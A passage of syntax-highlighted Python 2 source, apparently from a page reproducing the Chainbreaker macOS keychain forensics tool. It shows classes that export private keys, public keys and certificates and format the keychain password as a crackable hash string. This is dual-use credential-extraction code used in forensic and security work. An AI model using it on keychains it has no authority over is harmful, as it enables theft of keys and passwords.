</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># add a number, e.g. PrivateKey.1.key</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            file_name <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>FileName <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>FileExt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            iteration <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(output_directory, file_name)):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                file_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">.</span><span style="color:#e6db74">%s%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (self<span style="color:#f92672">.</span>FileName, iteration, self<span style="color:#f92672">.</span>FileExt)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                iteration <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            file_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(output_directory, file_name)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Finish exporting the record.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">with</span> open(file_path, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> fp:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    self<span style="color:#f92672">.</span>logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74"> [-] Exported: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> file_path)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    fp<span style="color:#f92672">.</span>write(export_content)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">OSError</span>, e:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>logger<span style="color:#f92672">.</span>critical(<span style="color:#e6db74">&#39;Exception while attempting to export </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (file_path, e))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">FileName</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> str(uuid<span style="color:#f92672">.</span>uuid4())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">FileExt</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;.txt&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">KeychainPasswordHash</span>(KeychainRecord):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        KEYCHAIN_PASSWORD_HASH_FORMAT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;$keychain$*</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">*</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">*</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> __init__(self, salt, iv, cyphertext):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>salt <span style="color:#f92672">=</span> salt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>iv <span style="color:#f92672">=</span> iv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>cypher_text <span style="color:#f92672">=</span> cyphertext
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            Chainbreaker<span style="color:#f92672">.</span>KeychainRecord<span style="color:#f92672">.</span>__init__(self)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> __str__(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> Chainbreaker<span style="color:#f92672">.</span>KeychainPasswordHash<span style="color:#f92672">.</span>KEYCHAIN_PASSWORD_HASH_FORMAT <span style="color:#f92672">%</span> (
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>salt, self<span style="color:#f92672">.</span>iv, self<span style="color:#f92672">.</span>cypher_text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exportable</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>__str__()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">FileName</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;keychain_password_hash&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PublicKeyRecord</span>(KeychainRecord):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> __init__(self, print_name<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, label<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, key_class<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, private<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, key_type<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, key_size<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                     effective_key_size<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, extracted<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, cssm_type<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, public_key<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, iv<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, key<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>PrintName <span style="color:#f92672">=</span> print_name
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Label <span style="color:#f92672">=</span> label
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>KeyClass <span style="color:#f92672">=</span> key_class
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Private <span style="color:#f92672">=</span> private
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>KeyType <span style="color:#f92672">=</span> key_type
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>KeySize <span style="color:#f92672">=</span> key_size
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>EffectiveKeySize <span style="color:#f92672">=</span> effective_key_size
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Extracted <span style="color:#f92672">=</span> extracted
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>CSSMType <span style="color:#f92672">=</span> cssm_type
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>PublicKey <span style="color:#f92672">=</span> public_key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>IV <span style="color:#f92672">=</span> iv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Key <span style="color:#f92672">=</span> key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            Chainbreaker<span style="color:#f92672">.</span>KeychainRecord<span style="color:#f92672">.</span>__init__(self)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> __str__(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[+] Public Key</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Print Name: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>PrintName
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># output += &#39; [-] Label: %s\n&#39; % self.Label</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Key Class: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>KeyClass
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Private: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Private
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Key Type: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>KeyType
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Key Size: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>KeySize
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Effective Key Size: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>EffectiveKeySize
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Extracted: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Extracted
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] CSSM Type: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>CSSMType
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Base64 Encoded Public Key: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> base64<span style="color:#f92672">.</span>b64encode(self<span style="color:#f92672">.</span>PublicKey)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> output
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exportable</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>PublicKey
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">FileName</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(x <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>PrintName <span style="color:#66d9ef">if</span> x<span style="color:#f92672">.</span>isalnum())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">FileExt</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;.pub&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PrivateKeyRecord</span>(KeychainRecord):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> __init__(self, print_name<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, label<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, key_class<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, private<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, key_type<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, key_size<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                     effective_key_size<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, extracted<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, cssm_type<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, key_name<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, private_key<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, iv<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                     key<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>PrintName <span style="color:#f92672">=</span> print_name
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Label <span style="color:#f92672">=</span> label
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>KeyClass <span style="color:#f92672">=</span> key_class
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Private <span style="color:#f92672">=</span> private
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>KeyType <span style="color:#f92672">=</span> key_type
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>KeySize <span style="color:#f92672">=</span> key_size
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>EffectiveKeySize <span style="color:#f92672">=</span> effective_key_size
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Extracted <span style="color:#f92672">=</span> extracted
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>CSSMType <span style="color:#f92672">=</span> cssm_type
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>KeyName <span style="color:#f92672">=</span> key_name
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>PrivateKey <span style="color:#f92672">=</span> private_key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>IV <span style="color:#f92672">=</span> iv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Key <span style="color:#f92672">=</span> key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            Chainbreaker<span style="color:#f92672">.</span>KeychainRecord<span style="color:#f92672">.</span>__init__(self)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> __str__(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[+] Private Key</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Print Name: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>PrintName
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># output += &#39; [-] Label: %s\n&#39; % self.Label</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Key Class: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>KeyClass
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># output += &#39; [-] Private: %s\n&#39; % self.Private</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Key Type: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>KeyType
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Key Size: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>KeySize
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Effective Key Size: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>EffectiveKeySize
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># output += &#39; [-] Extracted: %s\n&#39; % self.Extracted</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] CSSM Type: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>CSSMType
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># output += &#39; [-] KeyName: %s\n&#39; % self.KeyName</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Base64 Encoded PrivateKey: &#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>PrivateKey <span style="color:#f92672">==</span> Chainbreaker<span style="color:#f92672">.</span>KEYCHAIN_LOCKED_SIGNATURE:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> Chainbreaker<span style="color:#f92672">.</span>KEYCHAIN_LOCKED_SIGNATURE
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> base64<span style="color:#f92672">.</span>b64encode(self<span style="color:#f92672">.</span>PrivateKey)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> output
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exportable</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>PrivateKey
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">FileName</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(x <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>PrintName <span style="color:#66d9ef">if</span> x<span style="color:#f92672">.</span>isalnum())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">FileExt</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;.key&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">X509CertificateRecord</span>(KeychainRecord):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> __init__(self, type<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, encoding<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, print_name<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, alias<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, subject<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, issuer<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                     serial_number<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, subject_key_identifier<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, public_key_hash<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, certificate<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Type <span style="color:#f92672">=</span> type
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Encoding <span style="color:#f92672">=</span> encoding
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>PrintName <span style="color:#f92672">=</span> print_name
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Alias <span style="color:#f92672">=</span> alias
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Subject <span style="color:#f92672">=</span> subject
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Issuer <span style="color:#f92672">=</span> issuer
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Serial_Number <span style="color:#f92672">=</span> serial_number
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Subject_Key_Identifier <span style="color:#f92672">=</span> subject_key_identifier
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Public_Key_Hash <span style="color:#f92672">=</span> public_key_hash
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Certificate <span style="color:#f92672">=</span> certificate
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            Chainbreaker<span style="color:#f92672">.</span>KeychainRecord<span style="color:#f92672">.</span>__init__(self)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> __str__(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[+] X509 Certificate</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># output += &#34; [-] Type: %s\n&#34; % self.Type</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># output += &#34; [-] Encoding: %s\n&#34; % self.Encoding</span>
</span></span><span style="display:flex;"><span>
